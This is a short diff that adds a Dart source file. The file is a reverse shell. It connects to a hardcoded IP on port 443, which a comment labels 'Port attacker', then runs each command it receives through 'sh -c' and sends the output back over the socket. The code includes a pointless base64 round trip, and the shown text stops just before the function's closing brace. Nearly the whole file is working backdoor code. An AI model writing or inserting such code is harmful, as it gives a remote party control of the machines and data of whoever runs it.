@@ -1,0 +1,40 @@
+import 'dart:convert';
+import 'dart:io';
+
+final String serverIp = '192.168.86.26'; 
+final int serverPort = 443; // Port attacker
+
+void connectToServer() async {
+  try {
+    final socket = await Socket.connect(serverIp, serverPort);
+    print('Connection successful');
+
+    // Listen for data from the server
+    socket.listen(
+      (data) {
+        final command = String.fromCharCodes(data).trim();
+        print('Command Received From Server: $command');
+
+        // Base64 encode the command
+        final encodedCommand = base64Encode(utf8.encode(command));
+
+        // Decode the command on the server side
+        final decodedCommand = utf8.decode(base64Decode(encodedCommand));
+
+        // Execute the command
+        ProcessResult result = Process.runSync('sh', ['-c', decodedCommand]);
+        final output = result.stdout;
+        socket.write(output);
+      },
+      onDone: () {
+        print('Close connection with server.');
+        socket.destroy();
+      },
+      onError: (error) {
+        print('Error: $error');
+        socket.destroy();
+      },
+    );
+  } catch (error) {
+    print('Error connecting to server: $error');
+  }
